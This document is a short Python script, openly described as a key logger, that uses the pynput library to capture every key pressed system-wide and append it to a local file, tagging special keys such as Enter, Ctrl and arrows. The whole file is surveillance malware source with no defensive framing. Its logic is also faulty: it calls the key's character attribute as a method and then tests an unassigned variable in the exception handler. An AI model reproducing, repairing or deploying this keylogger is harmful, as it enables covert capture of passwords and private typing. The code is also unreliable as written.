# this is the code for key logger
from pynput import keyboard

def keyPressed(key):
   # print(str(key))
    with open("keyfile.txt",'a') as logkey:
        try:
            char=key.char()
            logkey.write(char)
        except :  # Handle special keys
            if char == keyboard.Key.space:
                logkey.write(" [SPACE] ")
            elif char == keyboard.Key.enter:
                logkey.write(" [ENTER] \n")
            elif char == keyboard.Key.backspace:
                logkey.write(" [BACKSPACE] ")
            elif char == keyboard.Key.tab:
                logkey.write(" [TAB] ")
            elif char == keyboard.Key.shift:
                logkey.write(" [SHIFT] ")
            elif char == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                logkey.write(" [CTRL] ")
            elif char == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                logkey.write(" [ALT] ")
            elif char == keyboard.Key.esc:
                logkey.write(" [ESC] ")
            elif char == keyboard.Key.up:
                logkey.write(" [UP] ")
            elif char == keyboard.Key.down:
                logkey.write(" [DOWN] ")
            elif char == keyboard.Key.left:
                logkey.write(" [LEFT] ")
            elif char == keyboard.Key.right:
                logkey.write(" [RIGHT] ")
            else:
                logkey.write(f" [{key}] ")  # Log other special keys

if __name__ =="__main__":
    listener= keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

